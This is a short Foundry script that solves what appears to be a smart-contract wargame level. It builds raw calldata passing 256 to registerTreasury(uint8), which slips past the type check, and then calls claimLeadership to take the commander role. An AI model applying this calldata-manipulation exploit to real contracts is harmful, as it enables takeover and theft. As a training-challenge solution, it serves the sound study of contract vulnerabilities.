pragma solidity ^0.8.14;

import {Script, console} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {HigherOrder} from "../src/Level30.sol";

contract Level30Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));
        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress, wallet.addr), "Solution failed");
    }

    function exploit(address _target) private {
        bytes memory data = abi.encodePacked(
            bytes4(keccak256("registerTreasury(uint8)")),
            uint256(256)
        );
        (bool ok,) = _target.call(data);
        require(ok, "registerTreasury failed");
        HigherOrder(_target).claimLeadership();
    }

    function levelDone(address _target, address _attacker) private returns (bool) {
        return HigherOrder(_target).commander() == _attacker;
    }
}
